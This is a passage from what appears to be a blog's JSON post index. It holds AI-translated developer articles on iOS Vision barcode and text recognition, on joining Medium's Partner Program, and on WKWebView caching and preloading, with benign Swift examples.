corner, and its values range between 0 and 1.let filePath = Bundle.main.path(forResource: \"IMG_6785\", ofType: \"png\")! // Local test imagelet fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // New API using Swift features var request = DetectBarcodesRequest() request.symbologies = [.ean13] // Specify only EAN13 Barcode to scan for better performance Task { do { let observations = try await request.perform(on: fileURL) if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // Marking color Layer let colorLayer = CALayer() // iOS &gt;=18 new coordinate conversion API toImageCoordinates // Untested, may still need to calculate ContentMode = AspectFit offset: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old approach let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadStringValue // Marking color Layer let colorLayer = CALayer() colorLayer.frame = self.convertBoundingBox(observation.boundingBox, to: self.baseImageView) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox)\") print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let request = VNDetectBarcodesRequest(completionHandler: completionHandler) request.symbologies = [.ean13] // Specify only EAN13 Barcode to scan for better performance DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}iOS ‚â• 18 Update Highlight:// iOS &gt;=18 new coordinate conversion API toImageCoordinatesobservation.boundingBox.toImageCoordinates(CGSize, origin: .upperLeft)// https://developer.apple.com/documentation/vision/normalizedpoint/toimagecoordinates(from:imagesize:origin:)Helper:// Gen by ChatGPT 4o// Because the photo's ImageView has ContentMode = AspectFit// We need to calculate the vertical offset caused by the Fit's blank spacefunc convertBoundingBox(_ boundingBox: CGRect, to view: UIImageView) -&gt; CGRect { guard let image = view.image else { return .zero } let imageSize = image.size let viewSize = view.bounds.size let imageRatio = imageSize.width / imageSize.height let viewRatio = viewSize.width / viewSize.height var scaleFactor: CGFloat var offsetX: CGFloat = 0 var offsetY: CGFloat = 0 if imageRatio &gt; viewRatio { // Image fits by width scaleFactor = viewSize.width / imageSize.width offsetY = (viewSize.height - imageSize.height * scaleFactor) / 2 } else { // Image fits by height scaleFactor = viewSize.height / imageSize.height offsetX = (viewSize.width - imageSize.width * scaleFactor) / 2 } let x = boundingBox.minX * imageSize.width * scaleFactor + offsetX let y = (1 - boundingBox.maxY) * imageSize.height * scaleFactor + offsetY let width = boundingBox.width * imageSize.width * scaleFactor let height = boundingBox.height * imageSize.height * scaleFactor return CGRect(x: x, y: y, width: width, height: height)}OutputBoundingBox: (0.5295758928571429, 0.21408638121589782, 0.0943080357142857, 0.21254415360708087)Payload: 4710018183805Symbology: VNBarcodeSymbologyEAN13Some products have no Barcode, such as loose fruits with only product labelsTherefore, our scanner also needs to support scanning plain text labels.let filePath = Bundle.main.path(forResource: \"apple\", ofType: \"jpg\")! // Local test imagelet fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // New API using Swift features var barcodesRequest = DetectBarcodesRequest() barcodesRequest.symbologies = [.ean13] // Specify EAN13 Barcode only to improve performance var textRequest = RecognizeTextRequest() textRequest.recognitionLanguages = [.init(identifier: \"zh-Hnat\"), .init(identifier: \"en-US\")] Task { do { let handler = ImageRequestHandler(fileURL) // parameter pack syntax and we must wait for all requests to finish before we can use their results. // let (barcodesObservation, textObservation, ...) = try await handler.perform(barcodesRequest, textRequest, ...) let (barcodesObservation, textObservation) = try await handler.perform(barcodesRequest, textRequest) if let observation = barcodesObservation.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // Highlight color layer let colorLayer = CALayer() // iOS &gt;=18 new coordinate conversion API toImageCoordinates // Untested, actual implementation may need to adjust for ContentMode = AspectFit offset: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } textObservation.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old implementation let barcodesCompletionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadStringValue // Highlight color layer let colorLayer = CALayer() colorLayer.frame = self.convertBoundingBox(observation.boundingBox, to: self.baseImageView) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox)\") print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let textCompletionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedTextObservation] else { return } observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } let barcodesRequest = VNDetectBarcodesRequest(completionHandler: barcodesCompletionHandler) barcodesRequest.symbologies = [.ean13] // Specify EAN13 Barcode only to improve performance let textRequest = VNRecognizeTextRequest(completionHandler: textCompletionHandler) textRequest.recognitionLevel = .accurate textRequest.recognitionLanguages = [\"en-US\"] DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([barcodesRequest, textRequest]) } catch { print(\"Request failed: \\(error)\") } }}Output:94128sORGANICPink Lady¬ÆProduce of UShiOS ‚â• 18 Update Highlight:let handler = ImageRequestHandler(fileURL)// parameter pack syntax and we must wait for all requests to finish before we can use their results.// let (barcodesObservation, textObservation, ...) = try await handler.perform(barcodesRequest, textRequest, ...)let (barcodesObservation, textObservation) = try await handler.perform(barcodesRequest, textRequest)iOS ‚â• 18 performAll( )?changes=latest_minor){:target=‚Äù_blank‚Äù} methodThe previous perform(barcodesRequest, textRequest) method requires both requests to complete before continuing; starting with iOS 18, a new performAll() method is provided, which changes the response to streaming, allowing handling as soon as one request returns a result, such as responding immediately when a barcode is scanned.if #available(iOS 18.0, *) { // New API using Swift features var barcodesRequest = DetectBarcodesRequest() barcodesRequest.symbologies = [.ean13] // Specify EAN13 barcode only for better performance var textRequest = RecognizeTextRequest() textRequest.recognitionLanguages = [.init(identifier: \"zh-Hnat\"), .init(identifier: \"en-US\")] Task { let handler = ImageRequestHandler(fileURL) let observation = handler.performAll([barcodesRequest, textRequest] as [any VisionRequest]) for try await result in observation { switch result { case .detectBarcodes(_, let barcodesObservation): if let observation = barcodesObservation.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // Mark color Layer let colorLayer = CALayer() // iOS &gt;=18 new coordinate conversion API toImageCoordinates // Untested, may still need to calculate displacement for ContentMode = AspectFit: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } case .recognizeText(_, let textObservation): textObservation.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } default: print(\"Unrecognized result: \\(result)\") } } }}Optimize with Swift ConcurrencyAssuming we have a photo wall list where each image needs automatic cropping to the main subject; in this case, Swift Concurrency can be used to improve loading efficiency.Original Codefunc generateThumbnail(url: URL) async throws -&gt; UIImage { let request = GenerateAttentionBasedSaliencyImageRequest() let saliencyObservation = try await request.perform(on: url) return cropImage(url, to: saliencyObservation.salientObjects)} func generateAllThumbnails() async throws { for image in images { image.thumbnail = try await generateThumbnail(url: image.url) }}Execute only one at a time, resulting in slow efficiency and performance.Optimization (1) ‚Äî TaskGroup Concurrencyfunc generateAllThumbnails() async throws { try await withThrowingDiscardingTaskGroup { taskGroup in for image in images { image.thumbnail = try await generateThumbnail(url: image.url) } }}Add each Task to a TaskGroup for concurrent execution. Issue: Image recognition and screenshot operations consume a lot of memory and performance. Adding unlimited parallel tasks may cause user lag and OOM crashes.Optimization (2) ‚Äî TaskGroup Concurrency + Limiting Parallelismfunc generateAllThumbnails() async throws { try await withThrowingDiscardingTaskGroup { taskGroup in // Maximum number of concurrent tasks should not exceed 5 let maxImageTasks = min(5, images.count) // Initially fill with 5 tasks for index in 0..&lt;maxImageTasks { taskGroup.addTask { image[index].thumbnail = try await generateThumbnail(url: image[index].url) } } var nextIndex = maxImageTasks for try await _ in taskGroup { // When a task in the taskGroup completes... // Check if index has reached the end if nextIndex &lt; images.count { let image = images[nextIndex] // Continue adding tasks one by one (keeping max at 5) taskGroup.addTask { image.thumbnail = try await generateThumbnail(url: image.url) } nextIndex += 1 } } }}Update an existing Vision app Vision will remove CPU and GPU support for some requests on devices with a neural engine. On these devices, the neural engine offers the best performance.You can check this using the supportedComputeDevices() API. Remove all VN prefixesVNXXRequest, VNXXXObservation -&gt; Request, Observation Use async/await to replace the original VNRequestCompletionHandler Use *Request.perform() directly instead of the original VNImageRequestHandler.perform([VN*Request]) Wrap-up API Designed for Swift Language Features New features and methods are Swift only, available for iOS ‚â• 18 New Image Rating Feature, Body + Hand Motion Tracking Thanks!KKday Recruitment AdvertisementüëâüëâüëâThis book club sharing originates from the weekly technical sharing sessions within the KKday App Team. The team is currently enthusiastically recruiting a Senior iOS Engineer. Interested candidates are welcome to apply. üëàüëàüëàReferencesDiscover Swift enhancements in the Vision frameworkThe Vision Framework API has been redesigned to leverage modern Swift features like concurrency, making it easier and faster to integrate a wide array of Vision algorithms into your app. We‚Äôll tour the updated API and share sample code, along with best practices, to help you get the benefits of this framework with less coding effort. We‚Äôll also demonstrate two new features: image aesthetics and holistic body pose.Chapters 0:00 ‚Äî Introduction 1:07 ‚Äî New Vision API 1:47 ‚Äî Get started with Vision 8:59 ‚Äî Optimize with Swift Concurrency 11:05 ‚Äî Update an existing Vision app 13:46 ‚Äî What‚Äôs new in Vision? Vision framework Apple Developer Documentation-If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Medium Partner ProgramÔΩúGlobal Access for Writers Including Taiwan‚ÄîEarn Revenue from Your Articles", "url": "/posts/zrealm-life/medium-partner-program-global-access-for-writers-including-taiwan-earn-revenue-from-your-articles-cefdf4d41746/", "categories": "ZRealm Life.", "tags": "medium, paywall, stripe, earnings, life, english, ai-translation", "date": "2024-08-10 17:09:15 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Medium Partner Program is Finally Open to Writers Worldwide (Including Taiwan)...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Medium Partner Program is Finally Open to Writers Worldwide (Including Taiwan)!Everyone can join the Medium Partner Program to write articles and earn revenue.Photo by Steve JohnsonMurmurThe original intention of running Medium was not to make money but to enjoy sharing with others‚Äîsharing technical challenges encountered, hoping to help developers with similar issues avoid detours, or deepening my own research from which I can also learn new knowledge. Additionally, since there are few Traditional Chinese writers, I hope to set an example and create a cycle of mutual learning.So I have never been too concerned about whether articles can generate profit or not. If there is profit, great; if not, that‚Äôs fine too. If there is, I can use the earnings to experiment, buy more services or experiences, and then turn those into articles to share with everyone, creating a virtuous cycle.Since I started writing on Medium in 2018, I have known about the Medium Partner Program. However, from 2018, 2019, 2020‚Ä¶ year after year, the Medium Partner Program policy had no updates and only allowed writers from a few regions (I remember only Singapore and Japan in Asia) to join and earn revenue. For writers outside these regions, earning was very troublesome, requiring a VPN to connect to allowed regions plus having an account or phone number from those regions. I researched a bit before but found it too troublesome and unsafe.Many creators have switched to other platforms like Matters, Fanggezi, or set up their own sites with ads for revenue. In recent years, Medium has indeed lost many Chinese-speaking creators.Medium Partner ProgramUntil recently in August 2024, I accidentally saw an invitation banner in Medium‚Äôs backend to join the Partner Program (I thought, ‚ÄúWhat? Taiwan still isn‚Äôt allowed‚Äù). After clicking and checking, I was surprised to find that it is now fully open. Creators from almost all regions can join the Partner Program and earn revenue word by word through their articles. It‚Äôs a bit funny that before you can join the Medium Partner Program to earn money, you first need to spend money to become a Medium Member (at least $4 per month).2024‚Äì08‚Äì07 Official Medium Blog AnnouncementWe‚Äôve added 77 countries to the Medium Partner Program Plus a $10 minimum, details about your earnings included in your Partner Program dashboard, and expanding the Boost‚Ä¶ blog.medium.comNew list of countries: Albania, Algeria, Angola, Antigua and Barbuda, Argentina, Armenia, Australia, Austria, Azerbaijan, Bahamas, Bahrain, Bangladesh, Belgium, Benin, Bhutan, Bolivia, Bosnia and Herzegovina, Botswana, Brunei, Bulgaria, Cambodia, Canada, Chile, Colombia, Costa Rica, C√¥te d‚ÄôIvoire, Croatia, Cyprus, Czech Republic, Denmark, Dominican Republic, Ecuador, Egypt, El Salvador, Estonia, Ethiopia, Finland, France, Gabon, Gambia, Germany, Ghana, Gibraltar, Greece, Guatemala, Guyana, Hong Kong, Hungary, India, Indonesia, Ireland, Israel, Italy, Jamaica, Japan, Jordan, Kazakhstan, Kenya, Kuwait, Laos, Latvia, Liechtenstein, Lithuania, Luxembourg, Macao, Madagascar, Malaysia, Malta, Mauritius, Mexico, Moldova, Monaco, Mongolia, Morocco, Mozambique, Namibia, Netherlands, New Zealand, Niger, Nigeria, North Macedonia, Norway, Oman, Pakistan, Panama, Paraguay, Peru, Philippines, Poland, Portugal, Qatar, Romania, Rwanda, Saint Lucia, San Marino, Saudi Arabia, Senegal, Serbia, Singapore, Slovakia, Slovenia, South Africa, South Korea, Spain, Sri Lanka, Sweden, Switzerland, Taiwan, Tanzania, Thailand, Trinidad and Tobago, Tunisia, Turkey, United Arab Emirates, United Kingdom, United States, Uruguay, Uzbekistan, and VietnamMedium Custom Domain FeatureRecently, Medium has been adding more features. Another feature that was once available, then closed, the custom domain, has now reopened.Medium Custom Domain Feature ReturnsYou can refer to my previous article ‚ÄúMedium Custom Domain Feature Returns‚Äù to register your own domain and link it to Medium. Effect: https://blog.zhgchg.li The custom domain feature also requires you to be a Medium Member to use.Payment Method &amp; Tax Issues Payment Method: Directly through Stripe, which is similar to Paypal but with lower fees and more focused on payment processing. Tax Issues: Non-US citizens only need to fill out a declaration form. Some Thoughts on Paywall Paid Articles Once an article is behind the Paywall and becomes a paid article, users must log in and join Medium Member paid membership to read the full content. The previously circulated unlimited monthly reading hacks are no longer effective. My high-traffic, SEO-friendly articles are mostly unboxings and travelogues; however, the readers are mostly casual visitors, not even regular Medium Members, let alone paying members. They just browse and leave, so these types of articles are not suitable for Paywall. Technical articles are often shared freely because the information is meant to be open and the authors don‚Äôt see their content as valuable. Also, since the traffic is mostly industry insiders, there is little motivation to add a Paywall.Or simultaneously provide a free link so that non-Medium Members can also read it. Traffic and revenue results can be referenced from Tenz Shih‚Äôs early shared data. I have selected several technical articles with good traffic and content to add to the Paywall for testing (a free link is included in the first paragraph, so readers without an account or payment can still view it). I will update the results later for your reference. Previously, I had already migrated to Self-hosted + Google Adsense using a custom tool for conversion: ‚ÄúSeamless Migration from Medium to Self-hosted Site.‚Äù However, I didn‚Äôt consider paid articles at that time, so I need to adjust the script again QQ. Detailed tutorial begins.Medium Partner Program Joining Process1. Complete Stripe Account Registration (Open Account) https://dashboard.stripe.com/register?locale=zh-Hans I registered a long time ago, so I‚Äôll skip the registration process below. 2. Make sure you are a Medium Member paying subscriberFirst, make sure you have a Medium Member or Medium Friend membership. If you don‚Äôt have one, you need to subscribe first.3. Go to the Medium Partner Program page to apply for membership Select your country where you are located; currently, almost all countries are supported.It is assumed that countries supporting Stripe payments are all included. Confirm that all three conditions are met: Already a Medium Member (paid subscriber) ‚úÖ Published at least one article in the past six months ‚úÖ Located in an allowed region, Taiwan ‚úÖ Click: Confirm you are at least 18 years old Confirm agreement to the terms of use Click ‚ÄúEnroll now‚Äù to proceed to the next step.4. Complete Medium x Stripe Linking Enter your email address Enter your phone number Business type: I chose ‚ÄúIndividual or Sole Proprietorship‚Äù Verify Your Personal Details: Enter your personal information. I was able to pass using Chinese input here.Add withdrawal account: Account holder name: Enter the bank account name you want to receive payments - English name (full name) SWIFT / BIC Code: Enter the SWIFT code of the bank you want to receive payments from. You can check it here Account: Enter the bank account number where you want to receive payments Here, I used a Cathay foreign currency account, directly checked the foreign currency account info in the app, and filled it in. (You can change it later in settings; it seems the verification happens only when disbursing funds) Review and Submit: After confirming the information is correct, click ‚ÄúAgree and Submit‚ÄùAfter submission, you will be redirected back to Medium to continue setting up your tax information.5. Complete Tax FilingThe following example uses a personal account without U.S. citizenship. Enter your personal information (in English) Address: Available via Chunghwa Post Translation Select Tax Form: For non-US citizens without any US status, choose the first option ‚ÄúW-8BEN ‚Äî for non-US individuals‚Äù Continue filling in the relevant personal information (English) Identification of Beneficial Owner (Continued) In this step, directly check ‚ÄúI can‚Äôt claim treaty benefits, so I‚Äôm not required to provide a Tax ID Number‚Äù and click ‚ÄúContinue‚Äù Claim of Treaty Benefits (Part II) Click ‚ÄúContinue‚Äù to proceed to the next step. Click ‚ÄúConfirm‚Äù to proceed After reviewing and confirming the information is correct, click ‚ÄúContinue‚Äù to proceed to the next step.Certification (Part III): Check all boxes, select ‚ÄúI am signing for myself.‚Äù, enter your full English name, the current date, and your contact email. Finally, click ‚ÄúSubmit Form‚Äù to send the entire form. Done!After submission, you will be redirected to the Payout settings page. If everything shows a ‚úÖ, it means you have successfully joined!Adding Articles to the Paywall to Start Earning RevenueNote that joining the Medium Partner Program alone does not generate earnings; articles must be placed behind a Paywall to receive revenue shares. Article Editing -&gt; ‚ÄúManage paywall setting‚Äù Check ‚ÄúPaywall your story‚Äù -&gt; ‚ÄúSave‚Äù Articles participating in revenue sharing will have a ‚≠êÔ∏è. This way, the article will generate revenue sharing.Free Viewing Link If you want to let a friend view the full article for free, you can choose ‚ÄúCopy Friend Link‚Äù from Share. This link allows free full access but will not generate any earnings.View Performance Reporthttps://medium.com/me/partner/dashboardMedium Partner Dashboard or Story Stats will now show the Earnings amount.The detailed article report will also show how many paying members have read it.Results of This ArticleThis article was behind a Paywall from the moment it was published (now removed). Here is a summary of the results after one month.$0.90Earnings201Views82Reads41%Read ratioObserving that only the number of Reads (paid users staying to read over 30 seconds) generates revenue, the payout amount is not fixed. It seems to be allocated based on views, claps, shares, etc. My counts are low, so each Read earns about $0.01 to $0.07.The above data is provided for your reference.Medium Custom Domain Promotion Medium Custom Domain Feature Returns You can follow the steps in the article above to register your own domain and link it to Medium. Result: from https://medium.com/@zhgchgli -&gt; https://blog.zhgchg.li If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS WKWebView Preload and CacheÔΩúBoost Page Load Speed with Efficient Resource Management", "url": "/posts/zrealm-dev/ios-wkwebview-preload-and-cache-boost-page-load-speed-with-efficient-resource-management-5033090c18ba/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, cache, webview, http-request", "date": "2024-07-28 17:53:05 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS WKWebView Page and File Resource Preload / Cache StudyiOS WKWebView Pre-do...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS WKWebView Page and File Resource Preload / Cache StudyiOS WKWebView Pre-download and Cache Resources to Improve Page Load Speed Research.Photo by Antoine GravierBackgroundFor some reason, I have always had a connection with ‚ÄúCache.‚Äù Previously, I was responsible for researching and implementing AVPlayer‚Äôs ‚ÄúiOS HLS Cache Implementation Exploration‚Äù and ‚ÄúComplete Guide to AVPlayer Local Cache.‚Äù Unlike streaming cache, which aims to reduce playback data usage, this time the main task is to improve the loading speed of in-app WKWebView. This also involves research on WKWebView preloading and caching. However, honestly, the WKWebView scenario is more complex. Unlike AVPlayer streaming video, which consists of one or multiple continuous chunk files and only requires file caching, WKWebView includes not only the page files but also imported resource files (.js, .css, fonts, images, etc.). These are rendered by the browser engine to display the page to the user. Many parts in this process are beyond the app‚Äôs control, from the network to frontend JavaScript performance and rendering methods, all of which take time.This article only explores the feasibility of iOS technology and is not necessarily the final solution. Overall, it is better for front-end developers to tackle this issue from the front end to achieve a more efficient result. Front-end partners are encouraged to optimize the First Contentful Paint and improve the HTTP Cache mechanism. This will speed up Web/mWeb itself, affect the speed of Android/iOS in-app WebViews, and also enhance Google SEO ranking.Technical DetailsiOS RestrictionsAccording to Apple Review Guidelines 2.5.6: Apps that browse the web must use the appropriate WebKit framework and WebKit JavaScript. You may apply for an entitlement to use an alternative web browser engine in your app. Learn more about these entitlements .Apps can only use Apple‚Äôs provided WebKit Framework (WKWebView) and are not allowed to use third-party or modified WebKit engines, otherwise they will not be approved for the App Store. Additionally, starting from iOS 17.4, to comply with regulations, the EU region can use other browser engines after obtaining special permission from Apple. What Apple doesn‚Äôt provide, we can‚Äôt do either.[Unverified] Research shows that even the iOS versions of Chrome and Firefox can only use Apple WebKit (WKWebView).Another very important thing: WKWebView runs on a separate thread outside the app‚Äôs main thread, so all requests and operations do not pass through our app.HTTP Cache FlowThe HTTP protocol already includes a Cache mechanism, and the system has implemented caching for all network-related components (URLSession, WKWebView, etc.). Therefore, the client app does not need to implement any caching on its own. It is also not recommended to create a custom caching system. Following the HTTP protocol is the fastest, most stable, and most efficient approach.The general workflow of HTTP Cache is shown in the above image: Client sends a request Server response cache strategies in the Response Header are automatically handled by system components like URLSession and WKWebView. They cache the response based on the Cache Header, and subsequent requests automatically apply this strategy. When requesting the same resource again, if the cache has not expired, directly read the local cache from memory or disk and respond to the app. If expired (expiration does not mean invalid), a real network request is sent to the server. If the content has not changed (still valid despite expiration), the server responds with 304 Not Modified (Empty Body). Although a network request is made, the response is basically in milliseconds with no response body, resulting in minimal traffic usage. If the content has changed, provide the data and Cache Header again. Caching can occur not only locally but also on network proxy servers or along the network path.Common HTTP Response Cache Header Parameters:expires: RFC 2822 datepragma: no-cache# Newer parameters:cache-control: private/public/no-store/no-cache/max-age/s-max-age/must-revalidate/proxy-revalidate...etag: XXXCommon HTTP Request Cache Header Parameters:If-Modified-Since: 2024-07-18 13:00:00IF-None-Match: 1234 In iOS, network-related components (URLSession, WKWebView, etc.) automatically handle HTTP Request/Response Cache Headers and manage caching, so we do not need to handle Cache Header parameters ourselves.For more detailed HTTP Cache operation details, refer to ‚ÄúStep-by-step Understanding of HTTP Cache Mechanism by Huli‚Äù.Overview of iOS WKWebViewBack to iOS, since we can only use Apple WebKit, we have to rely on the WebKit methods provided by Apple to explore possible ways to achieve preloading cache.The above image shows all Apple iOS WebKit (WKWebView) related methods introduced by ChatGPT 4o, along with brief descriptions; the green sections indicate methods related to data storage.Sharing with everyone a few of the more interesting methods: WKProcessPool: Allows multiple WKWebViews to share resources, data, cookies, and more. WKHTTPCookieStore: Manages WKWebView cookies, including cookies shared between WKWebViews or between URLSession and WKWebView within the app. WKWebsiteDataStore: Manages website cache files. (Can only read information and clear data) WKURLSchemeHandler: Registers a custom handler to manage URL schemes that WKWebView does not recognize. WKContentWorld: Groups and manages injected JavaScript (WKUserScript) scripts. WKFindXXX: Controls the page search function. WKContentRuleListStore: Enables content blockers within WKWebView (e.g., ad blocking). Feasibility Study on Preloading Cache for iOS WKWebViewImprove HTTP Cache ‚úÖAs introduced earlier about the HTTP Cache mechanism, we can ask the Web Team to improve the HTTP Cache settings for the event page. On the client iOS side, we only need to simply check the CachePolicy settings; the system handles the rest!CachePolicy SettingsURLSession:let configuration = URLSessionConfiguration.defaultconfiguration.requestCachePolicy = .useProtocolCachePolicylet session = URLSession(configuration: configuration)URLRequest/WKWebView:var request = URLRequest(url: url)request.cachePolicy = .reloadRevalidatingCacheData//wkWebView.load(request) useProtocolCachePolicy: Default, follows the default HTTP Cache control. reloadIgnoringLocalCacheData: Do not use local cache; each request loads data from the network (but allows network and proxy caching). reloadIgnoringLocalAndRemoteCacheData: Always load data from the network, ignoring both local and remote caches. returnCacheDataElseLoad: Use cached data if available; otherwise, load data from the network. returnCacheDataDontLoad: Use only cached data; if no cache is available, do not make a network request. reloadRevalidatingCacheData: Sends a request to check if the local cache has expired. If not expired (304 Not Modified), it uses the cached data; otherwise, it reloads data from the network. Set Cache SizeApp Global:let memoryCapacity = 512 * 1024 * 1024 // 512 MBlet diskCapacity = 10 * 1024 * 1024 * 1024 // 10 GBlet urlCache = URLCache(memoryCapacity: memoryCapacity, diskCapacity: diskCapacity, diskPath: \"myCache\") URLCache.shared = urlCacheIndividual URLSession:let memoryCapacity = 512 * 1024 * 1024 // 512 MBlet diskCapacity = 10 * 1024 * 1024 * 1024 // 10 GBlet cache = URLCache(memoryCapacity: memoryCapacity, diskCapacity: diskCapacity, diskPath: \"myCache\") let configuration = URLSessionConfiguration.defaultconfiguration.urlCache = cache Also as mentioned before, WKWebView runs on a separate thread outside the app‚Äôs main thread, so the cache of URLRequest and URLSession is not shared with WKWebView.How to Use Safari Developer Tools in WKWebView?Check if local Cache is being used.Enable Developer Features in Safari:Enable isInspectable for WKWebView:func makeWKWebView() -&gt; WKWebView { let webView = WKWebView(frame: .zero) webView.isInspectable = true // is only available in iOS 16.4 or newer return webView}WKWebView requires webView.isInspectable = true to enable Safari Developer Tools in Debug Build.p.s. This is a separate test project I created for WKWebView.Set a breakpoint at the webView.load line.Start Test:Build &amp; Run:When the breakpoint at webView.load is hit, click ‚ÄúStep Over‚Äù.Go back to Safari, select the toolbar‚Äôs ‚ÄúDevelop‚Äù -&gt; ‚ÄúSimulator‚Äù -&gt; ‚ÄúYour Project‚Äù -&gt; ‚Äúabout:blank‚Äù. Because the page has not started loading, the URL will be about:blank If ‚Äúabout:blank‚Äù does not appear, go back to XCode and click the step-by-step debug button again until it appears. The developer tools corresponding to this page appear as follows:Back to XCode and click Continue to run:Returning to Safari Developer Tools, you can see resource loading status and the full set of developer tool features (components, storage debugging, etc.).If the online resource has HTTP Cache, the transfer size will show as ‚Äúdisk‚Äù:Clicking in also shows cache information.Clear WKWebView Cache// Clean CookiesHTTPCookieStorage.shared.removeCookies(since: Date.distantPast)// Clean Stored Data, Cache Datalet dataTypes = WKWebsiteDataStore.allWebsiteDataTypes()let store = WKWebsiteDataStore.default()store.fetchDataRecords(ofTypes: dataTypes) { records in records.forEach { record in store.removeData( ofTypes: record.dataTypes, for: records, completionHandler: { print(\"clearWebViewCache() - \\(record)\") } ) }}You can use the above methods to clear cached resources, local data, and cookie data in WKWebView. But improving HTTP Cache only affects caching (fast on the second visit), it does not impact preloading (the first visit). ‚úÖImprove HTTP Cache + WKWebView Full Page Preload üòïclass WebViewPreloader { static let shared = WebViewPreloader() private var _webview: WKWebView = WKWebView() private init() { } func preload(url: URL) { let request = URLRequest(url: url) Task { @MainActor in webview.load(request) } }}WebViewPreloader.shared.preload(\"https://zhgchg.li/campaign/summer\")After improving the HTTP Cache, the second time WKWebView loads, it will have cached data. We can preload all the URLs in the list or homepage once to create the cache, so when users enter, it will be faster. After testing, it is feasible in principle; however, it greatly affects performance and network traffic ; users may not even visit the detail page, but we preload and load all pages at once, which feels like shooting blindly. Personally, I think it is impractical in reality, and the drawbacks outweigh the benefits, making it a case of cutting off one‚Äôs nose to spite one‚Äôs face.üòïEnhanced HTTP Cache + WKWebView Preload for Static Resources üéâBased on the above optimization method, we can combine the HTML Link Preload technique to preload only the resource files used on the page (e.g., .js, .css, fonts, images). This allows users to directly use cached resources upon entering, without making additional network requests for resource files. This means I no longer preload 